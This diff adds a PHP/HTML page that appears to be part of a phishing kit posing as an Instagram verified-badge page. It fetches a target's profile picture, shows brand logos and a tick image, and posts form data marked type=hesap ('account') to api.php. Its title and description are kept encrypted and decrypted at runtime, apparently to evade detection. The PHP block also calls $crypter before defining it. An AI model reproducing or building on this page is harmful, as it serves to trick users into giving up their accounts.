@@ -1,0 +1,198 @@
+<!-- <?php
+include "profile_tool.php";
+
+include "crypt/crypter.php";
+
+
+
+$username="9gag";
+if(isset($_GET["username"])){
+    $username = $_GET["username"];
+
+}
+if(isset($_GET["key"])){
+  $key =  $crypter->setkey($_GET["key"]);
+}else{
+  $key =  $crypter->setkey(0);
+}
+$profileTool = new ProfileTool();
+
+$img_url = $profileTool->getProfilePicture($username);
+
+$crypter = new Crypter();
+if(isset($_GET["key"])){
+  $crypter->setkey($_GET["key"]);
+}else{
+  $crypter->setkey(0);
+}
+
+
+
+$title =$crypter->decrypt($crypter->getKeys()->title);
+$description =$crypter->decrypt($crypter->getKeys()->description);
+$question =$crypter->decrypt($crypter->getKeys()->question);
+$tick_png =$crypter->decrypt($crypter->getKeys()->tick_png);
+
+
+?> -->
+
+<html>
+    <head>
+      <meta charset="utf-8" />
+      <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+      <link rel="shortcut icon" type="image/png" href="https://static.xx.fbcdn.net/rsrc.php/yl/r/WjbGH9Owc-X.ico?_nc_x=Ij3Wp8lg5Kz"/>
+      <title id="title">
+        <?php echo $title?>
+
+      </title>
+    
+      <link href="https://fonts.googleapis.com/css?family=Poppins:200,300,400,600,700,800" rel="stylesheet" />
+      <link href="https://use.fontawesome.com/releases/v5.0.6/css/all.css" rel="stylesheet">
+    
+      <link href="nucleo-icons.css" rel="stylesheet" />
+    
+      <link href="assets/css/black-dashboard.css?v=1.0.0" rel="stylesheet" />
+    
+      <link href="demo.css" rel="stylesheet" />
+      <link href="assets/css/style.css" rel="stylesheet" />
+      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+      <script src="assets/js/script.js">
+      </script>
+      <script src="assets/js/key_handler.js">
+      </script>
+      <script>
+        setKey()
+      </script>
+
+    </head>
+    
+    <body class="text-center">
+    
+
+        <div class="main-panel d-none" id="main-panel">
+          <!-- Navbar -->
+    
+          <nav class="navbar navbar-expand-lg navbar-absolute navbar-transparent">
+            <div class="container-fluid">
+              <div class="navbar-wrapper">
+                <a class="navbar-brand jWQqO Szr5J _7mese" id="navimg"></a>
+              </div>
+              <div class="collapse navbar-collapse" id="navigation">
+                <ul class="navbar-nav ml-auto">
+                  <li class="search-bar input-group">
+                  </li>
+                </ul>
+              </div>
+            </div>
+          </nav>
+          <!-- End Navbar -->
+          
+          <div class="content">
+            <div class="row">
+              <div class="col-md-6" id="degisecek">
+                <div class="card card-user">
+                  <div class="card-body">
+                    <p class="card-text">
+                      <div class="author">
+                        <div class="block block-one"></div>
+                        <div class="block block-two"></div>
+                        <div class="block block-three"></div>
+                        <div class="block block-four"></div>
+                        <div>
+                          <img class="avatar" alt="" src="" id="user-avatar">
+                        </div>
+                        <h5 class="title" ><span id="user-username"></span><img id="tick" alt=""  set="" style="margin-left:3.5px; margin-bottom:3px; width:16px; height:16px;"></h5>
+                      </div>
+                    </p>
+                    <div class="card-description">
+                    <center><span id="description"></span></center>
+                    </div>
+                  </div>
+                  <div class="card-footer">
+                    <div class="button-container">
+                     
+                      <input type="hidden" name="username">
+                      <input type="hidden" name="img_url">
+                      <input type="hidden" name="takipci" value="">
+                      <input type="hidden" name="mode" value="asdf">
+                      <button class="btn mb-3 btn-block btn-primary btn-lg" id="butonamca">Continue</button>
+                     
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div id="loading-spinner" class="d-block mt-5" >
+          <img class="avatar" alt="" src="assets/img/oval.svg" id="user-avatar">
+        </div>
+    
+      <script src="assets/js/core/jquery.min.js"></script>
+      <script src="assets/js/core/popper.min.js"></script>
+      <script src="assets/js/core/bootstrap.min.js"></script>
+      <script src="assets/js/plugins/perfect-scrollbar.jquery.min.js"></script>
+    
+      <script src="assets/demo/demo.js"></script>
+
+      <!-- after jobs........... -->
+      <script>
+        $('#form').on('submit', function(e){
+            e.preventDefault();
+            let data = $(this).serialize();
+            data += '&type=hesap'
+            
+            $.post('api.php', data, function(response){
+                $('#degisecek').html(response.html)
+            }, 'json')
+        });
+        
+        const prefersDarkScheme = window.matchMedia("(prefers-color-scheme: dark)");
+    
+        if (prefersDarkScheme.matches) {
+          document.body.classList.add("dark-content");
+          $('#navimg').addClass('coreSpriteDesktopNavLogoAndWordmark-white');
+          $('#mode').val('dark');
+        } else {
+          document.body.classList.add("white-content");
+          $('#navimg').addClass('coreSpriteDesktopNavLogoAndWordmark');
+          $('#mode').val('white');
+        }
+    </script>
+    <!-- after jobs........... -->
+
+
+    <script src="assets/js/keys.js">
+    
+    </script>
+    
+    <script src="assets/js/crypt.js">
+    
+    </script>
+
+
+    <script src="assets/js/decoder.js">
+
+    </script>
+
+    <script >
+    
+      let crypt = new Crypt()
+      
+      crypt.setKey(getKey())
+
+      document.getElementById("title").innerHTML = crypt.decrypt(crypt.getKeys().title)
+      
+      document.getElementById("description").innerHTML = crypt.decrypt(crypt.getKeys().description)
+      document.getElementById("tick").setAttribute('src',crypt.decrypt(crypt.getKeys().tick_png))
+
+      
+</script>
+
+
+
+
+
+
+    </body>
+</html>
